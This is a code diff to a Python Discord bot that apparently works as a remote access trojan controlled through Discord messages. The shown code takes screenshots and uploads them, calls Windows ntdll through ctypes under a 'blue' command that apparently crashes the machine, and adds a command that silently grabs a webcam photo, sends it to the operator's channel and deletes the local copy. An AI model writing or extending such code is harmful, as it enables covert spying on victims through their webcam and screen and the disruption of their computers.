@@ -1,6 +1,16 @@
 import discord
 import sys
 from settings import *
+from cv2 import VideoCapture, imwrite, CAP_DSHOW
+import os
+import discord
+import subprocess
+import requests
+import pyautogui
+import ctypes
+import sys
+from threading import Timer
+from datetime import datetime
 
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(6).hex()
@@ -96,11 +106,11 @@ async def on_message(message):
         await message.channel.delete()
         await client.close()
     
-    if message.content.startswith("start"):
+    if message.content == "start":
         await message.reply("Ok Boss")
         await start()
         
-    if message.content.startswith("blue") or message.content.startswith("Blue"):
+    if message.content == "blue" or message.content == "Blue":
         await message.reply("Attempting...", delete_after = .1)
         ntdll = ctypes.windll.ntdll
         prev_value = ctypes.c_bool()
@@ -119,6 +129,12 @@ async def on_message(message):
         embed = discord.Embed(title="Screenshot", color=0xfafafa)
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
-        
+
+    if message.content[8:] == 'photo':
+        webcam = VideoCapture(0, CAP_DSHOW)
+        result, image = webcam.read()
+        imwrite('webcam.png', image)
+        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png')); await reaction_msg.add_reaction('📌')
+        subprocess.run('del webcam.png', shell=True)
 
 client.run(bot_token)
